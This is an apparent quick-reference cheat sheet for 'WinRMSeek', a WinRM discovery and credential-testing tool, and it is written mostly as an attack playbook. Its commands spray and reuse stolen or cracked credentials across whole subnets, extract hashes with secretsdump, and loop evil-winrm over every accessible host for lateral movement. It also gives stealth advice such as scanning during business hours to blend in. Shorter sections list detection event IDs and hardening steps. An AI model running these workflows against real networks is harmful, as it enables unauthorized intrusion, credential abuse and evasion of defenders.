# WinRMSeek Quick Reference

## Quick Start

```bash
# Basic WinRM discovery
./winrmseek.py 192.168.1.0/24

# Test authentication
./winrmseek.py -f targets.txt -t -u administrator -p Password123

# HTTPS only scan
./winrmseek.py --ssl -f servers.txt

# Fast scan with verbose output
./winrmseek.py 10.0.0.0/16 -w 50 -v
```

## Common Commands

### Discovery
```bash
# Scan single IP
./winrmseek.py 192.168.1.10

# Scan CIDR range
./winrmseek.py 10.0.0.0/24

# Scan from file
./winrmseek.py -f targets.txt

# HTTPS only (port 5986)
./winrmseek.py --ssl-only -f servers.txt
```

### Authentication Testing
```bash
# Test domain credentials
./winrmseek.py -f hosts.txt -t -u "CORP\admin" -p "Password123"

# Test local admin
./winrmseek.py -t -u administrator -p "LocalPass!" 192.168.1.0/24

# Test UPN format
./winrmseek.py -t -u "admin@corp.local" -p "Pass123" -f dcs.txt
```

### Performance Tuning
```bash
# Fast scan (50 concurrent workers)
./winrmseek.py -w 50 10.0.0.0/24

# Slow/stealthy (5 workers)
./winrmseek.py -w 5 --timeout 10 -f targets.txt

# Increase timeout for slow networks
./winrmseek.py --timeout 10 -f remote_sites.txt
```

## Output Files

| File | Description |
|------|-------------|
| `winrmlist.txt` | WinRM-enabled hosts |
| `winrm_access.txt` | Successful authentications |
| `winrm_details.txt` | Detailed findings |
| `winrm_details.json` | JSON export |

## WinRM Ports

| Port | Protocol | Description |
|------|----------|-------------|
| 5985 | HTTP | WinRM over HTTP (unencrypted) |
| 5986 | HTTPS | WinRM over HTTPS (SSL/TLS) |

## evil-winrm Integration

### Connect to Discovered Hosts
```bash
# 1. Discover WinRM hosts
./winrmseek.py -f network.txt

# 2. Connect with evil-winrm
evil-winrm -i 192.168.1.10 -u administrator -p Password123

# 3. HTTPS connection
evil-winrm -i 192.168.1.10 -u admin -p pass -S

# 4. With domain
evil-winrm -i dc01.corp.local -u "CORP\admin" -p "Pass123"
```

### Batch Access
```bash
# Access all authenticated hosts
for ip in $(grep "Access Found" winrm_access.txt | cut -d: -f1); do
    echo "[*] Connecting to $ip"
    evil-winrm -i $ip -u administrator -p Password123 -e "whoami"
done
```

## Username Formats

```bash
# Domain account (backslash)
-u "DOMAIN\username"

# Domain account (UPN)
-u "username@domain.com"

# Local account
-u "administrator"
-u ".\administrator"

# Specify domain explicitly
-u "CORP\admin"
```

## Attack Workflows

### Workflow 1: Initial Discovery
```bash
# 1. Find WinRM hosts
./winrmseek.py 192.168.0.0/16 -w 100

# 2. Check results
cat winrmlist.txt

# 3. Try default credentials
./winrmseek.py -f winrmlist.txt -t -u administrator -p "Password123"
```

### Workflow 2: Credential Reuse
```bash
# Got creds from password spraying: admin / Summer2024!
./winrmseek.py -f all_servers.txt -t -u admin -p "Summer2024!"

# Check successful access
cat winrm_access.txt

# Connect to first accessible host
IP=$(head -1 winrm_access.txt | cut -d: -f1)
evil-winrm -i $IP -u admin -p "Summer2024!"
```

### Workflow 3: Local Admin Hunt
```bash
# Compromised one workstation, got local admin pass
./winrmseek.py 10.0.0.0/16 -t -u administrator -p "LocalAdmin123"

# Find all hosts with same password
grep "Access Found" winrm_access.txt > vulnerable_hosts.txt

# Lateral movement
while read host; do
    ip=$(echo $host | cut -d: -f1)
    evil-winrm -i $ip -u administrator -p "LocalAdmin123" -e "hostname"
done < vulnerable_hosts.txt
```

### Workflow 4: Post-Kerberoasting
```bash
# Cracked service account from Kerberoast
# svc-backup / BackupPass2024!

./winrmseek.py -f servers.txt -t -u "CORP\svc-backup" -p "BackupPass2024!"

# Access any systems where service account can WinRM
cat winrm_access.txt
```

## Common Options

```
Targeting:
  IP/CIDR                  Single IP or range (192.168.1.0/24)
  -f, --file FILE          File with targets

Authentication:
  -t, --test-auth          Test authentication
  -u, --username USER      Username (DOMAIN\user)
  -p, --password PASS      Password

Connection:
  --ssl                    Use HTTPS (5986)
  --ssl-only               HTTPS only, skip HTTP
  --timeout N              Timeout in seconds (default: 3)
  
Performance:
  -w, --workers N          Concurrent threads (default: 10)
  
Output:
  -v, --verbose            Detailed output
  -o, --output DIR         Output directory
  --json                   JSON only
```

## Integration Examples

### With CrackMapExec
```bash
# 1. Find WinRM hosts
./winrmseek.py 10.0.0.0/24

# 2. Credential spray with CME
crackmapexec winrm -f winrmlist.txt -u users.txt -p passwords.txt

# 3. Verify successful creds
./winrmseek.py -f winrmlist.txt -t -u found_user -p found_pass
```

### With Metasploit
```bash
# 1. Discover targets
./winrmseek.py -f targets.txt

# 2. Use in Metasploit
use auxiliary/scanner/winrm/winrm_login
set RHOSTS file:winrmlist.txt
set USERNAME administrator
set PASSWORD Password123
run
```

### With Impacket
```bash
# 1. Extract creds with secretsdump
secretsdump.py DOMAIN/user:pass@dc.corp.local

# 2. Test on WinRM hosts
./winrmseek.py -f servers.txt -t -u administrator -p extracted_hash

# 3. Access via evil-winrm
evil-winrm -i TARGET -u administrator -p extracted_pass
```

## Quick Checks

```bash
# Count WinRM hosts found
wc -l winrmlist.txt

# Count authenticated hosts
wc -l winrm_access.txt

# Show HTTP vs HTTPS
grep "(HTTP)" winrmlist.txt | wc -l
grep "(HTTPS)" winrmlist.txt | wc -l

# Extract just IP addresses
cut -d: -f1 winrmlist.txt

# Check for specific subnet
grep "192.168.1." winrm_access.txt
```

## Detection Indicators

### Network
- Multiple connections to ports 5985/5986
- Connection attempts from unusual sources
- High volume authentication attempts

### Windows Events
- **Event 4624**: Successful logon (Type 3)
- **Event 4625**: Failed logon
- **Event 91**: WinRM connection accepted
- **Event 142**: New WinRM session

### PowerShell Events
- **Event 4103**: Module logging
- **Event 4104**: Script block logging

## Defense Quick Tips

```powershell
# Disable WinRM
Stop-Service WinRM
Set-Service WinRM -StartupType Disabled

# Require HTTPS only
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $false

# Limit source IPs
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -RemoteAddress 10.0.0.0/24

# Enable logging
wevtutil sl Microsoft-Windows-WinRM/Operational /e:true
```

## Troubleshooting

### No Hosts Found
```bash
# Increase timeout
./winrmseek.py --timeout 10

# Verify connectivity
ping target.ip
nmap -p 5985,5986 target.ip

# Check if WinRM is enabled (from target)
Get-Service WinRM
```

### Authentication Fails
```bash
# Test manually
evil-winrm -i TARGET -u USER -p PASS

# Try different username formats
-u "DOMAIN\user"
-u "user@domain.com"
-u ".\user"

# Check account status
net user USERNAME /domain
```

### SSL Errors
```bash
# Use HTTP only
./winrmseek.py -f targets.txt --http-only

# Test HTTPS manually
curl -k https://target:5986/wsman
```

## Tips & Tricks

### 🎯 Targeting
- **Servers first**: WinRM more common on servers
- **Check both ports**: Some use 5985, some 5986, some both
- **Domain controllers**: Usually have WinRM enabled
- **Management hosts**: IT admin workstations often have WinRM

### 🔒 Stealth
- **Slow down**: Use `-w 5` for fewer concurrent connections
- **Business hours**: Scan during work hours to blend in
- **Valid creds**: Successful auth less suspicious than failures
- **Space out scans**: Don't scan entire network at once

### ⚡ Speed
- **More workers**: Use `-w 50` or higher for large scans
- **Reduce timeout**: `--timeout 2` for fast networks
- **Target selection**: Focus on likely targets
- **Parallel scans**: Split targets across multiple processes

### 🎓 Learning
- **Practice in lab**: Set up test environment first
- **Study events**: Review Windows Event Logs
- **Try evil-winrm**: Learn PowerShell remoting
- **Read docs**: Microsoft WinRM documentation

## Real-World Scenarios

### Scenario 1: Password Reuse
```bash
# Found one valid credential pair
# Test across all systems
./winrmseek.py 10.0.0.0/16 -t -u admin -p "Found123!" -w 100
# Result: 47 hosts with same credentials
```

### Scenario 2: Local Admin Hash
```bash
# Extracted local admin hash from one machine
# Test on all workstations
./winrmseek.py -f workstations.txt -t -u administrator -p "ExtractedPass"
# Result: 200+ workstations vulnerable (password reuse)
```

### Scenario 3: Service Account
```bash
# Found service account in script
# CORP\svc-deploy / DeployPass2024!
./winrmseek.py -f all_hosts.txt -t -u "CORP\svc-deploy" -p "DeployPass2024!"
# Result: Access to 15 application servers
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success - WinRM found |
| 1 | No WinRM hosts found |
| 2 | Authentication failed |
| 3 | No targets specified |

## Quick Reference Card

```
┌─────────────────────────────────────────────────────┐
│              WINRMSEEK CHEAT SHEET                  │
├─────────────────────────────────────────────────────┤
│ PORTS                                               │
│  5985              WinRM HTTP                       │
│  5986              WinRM HTTPS                      │
├─────────────────────────────────────────────────────┤
│ DISCOVERY                                           │
│  ./winrmseek.py 10.0.0.0/24                        │
│  ./winrmseek.py -f targets.txt                     │
├─────────────────────────────────────────────────────┤
│ AUTH TESTING                                        │
│  -t -u USER -p PASS    Test credentials            │
├─────────────────────────────────────────────────────┤
│ EXPLOITATION                                        │
│  evil-winrm -i IP -u USER -p PASS                  │
├─────────────────────────────────────────────────────┤
│ OUTPUTS                                             │
│  winrmlist.txt         All WinRM hosts             │
│  winrm_access.txt      Successful auth             │
└─────────────────────────────────────────────────────┘
```

## One-Liners

```bash
# Quick scan and connect
./winrmseek.py 192.168.1.0/24 && evil-winrm -i $(head -1 winrmlist.txt | cut -d: -f1) -u admin -p pass

# Find and exploit in one command
./winrmseek.py -f nets.txt -t -u admin -p pass && grep "Access Found" winrm_access.txt

# Count accessible hosts
./winrmseek.py -f all.txt -t -u admin -p pass | grep -c "Access Found"

# Export to CSV
cat winrm_access.txt | sed 's/:5985/,5985/' | sed 's/:5986/,5986/' > results.csv
```

## Related Commands

```bash
# Check WinRM status (Windows)
Get-Service WinRM
Test-WSMan -ComputerName target.ip

# Enable WinRM (Windows)
Enable-PSRemoting -Force

# Check WinRM config
winrm get winrm/config

# List trusted hosts
Get-Item WSMan:\localhost\Client\TrustedHosts

# Test PowerShell remoting
Enter-PSSession -ComputerName target -Credential (Get-Credential)
```

## Learning Resources

- **Microsoft Docs**: WinRM and PowerShell Remoting
- **evil-winrm**: https://github.com/Hackplayers/evil-winrm
- **MITRE ATT&CK**: T1021.006 (Remote Services: Windows Remote Management)
- **HackTricks**: WinRM pentesting guide
- **IPPSec Videos**: WinRM exploitation walkthroughs
